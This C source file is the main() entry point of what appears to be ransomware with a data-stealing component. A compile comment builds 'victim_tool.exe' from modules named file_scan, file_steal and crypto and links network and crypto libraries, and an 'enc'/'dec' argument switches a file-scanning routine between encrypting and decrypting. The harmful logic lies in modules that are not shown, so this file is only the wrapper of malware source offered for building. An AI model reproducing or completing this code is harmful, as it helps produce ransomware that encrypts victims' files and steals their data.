#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include "file_scan.h"

int main(int argc, char *argv[]) {
// compile: x86_64-w64-mingw32-gcc main.c file_scan.c file_steal.c crypto.c -o victim_tool.exe -lwininet -ladvapi32 -lcrypt32 -lws2_32 
    bool decryptMode = false;

    if (argc > 1) {
        if (strcmp(argv[1], "dec") == 0) {
            decryptMode = true;
        } else if (strcmp(argv[1], "enc") == 0) {
            decryptMode = false;
        } else return 1;
    } else return 1;

    FileScan(decryptMode);

    return 0;
}